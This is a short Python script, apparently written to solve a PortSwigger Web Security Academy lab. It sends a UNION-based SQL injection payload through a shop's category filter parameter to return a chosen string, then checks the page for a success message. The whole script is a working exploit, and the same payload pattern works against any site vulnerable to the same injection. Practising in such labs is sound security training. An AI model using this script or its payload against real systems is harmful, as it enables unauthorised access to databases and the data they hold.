import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. E.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-union-text.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target and get the random string we need
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
    random_string = input('What is the random string we are looking for? (E.g. aBc123) ')
else:
    print('[!] Target seems down')
    exit(0)

# create the payload
payload = args.target + "/filter?category=Accessories' UNION SELECT null,'" + random_string + "',null--"
print('[*] Payload created: ' + payload)

r = requests.get(payload)
if r.status_code == 200:
    print('[*] Payload sent')
    # check the contents of the file
    completion_text = b'Congratulations'
    if completion_text in r.content:
        print('[*] Success')
else:
    print('[!] Exploit failed')
    exit(0)
